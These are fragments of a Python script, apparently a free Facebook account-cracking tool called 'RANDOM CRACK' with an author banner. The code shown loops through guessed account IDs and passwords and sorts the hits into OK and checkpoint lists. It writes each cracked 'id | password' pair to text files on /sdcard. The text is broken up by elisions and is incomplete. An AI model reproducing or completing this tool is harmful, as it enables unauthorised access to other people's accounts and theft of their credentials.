...
\033[1;95m  
   \033[1;92m
 ┌─────────────────────────────────────────┐
 │ [✓] AUTHOR   : TANVIR HOSEN L1KH0N         │
 │ [✓] TOOL     : RANDOM CRACK             │
 │ [✓] STATUS   : FREE                     │
 │ [✓] GITHUB   : 6T9 L1KH0N         │
 │ [✓] FACEBOOK : Tanvir hosen Likhon              │
 └─────────────────────────────────────────┘""")
try:
...
L1KH0N-OK.txt', 'a').write( cid+' | '+ps+'\n')
                ...
                cid = coki[24:39]
                if 'y' in cp_cpx: 
                 print('\r\r\033[1;30m[L1KH0N-CP]  ' +uid+ ' | ' +ps+ ' \033[0;97m')
                open('/sdcard/L1KH0N-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\r%s\033[0;97m[\033[0;96mL1KHON\033[0;97m]..[\033[0;94m%s/%s\033[0;97m]..[\033[0;92mOK\033[0;97m/\033[0;91mCP\033[0;97m]..[\033[0;92m%s\033[0;97m/\033[0;91m%s\033[0;97m] '%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
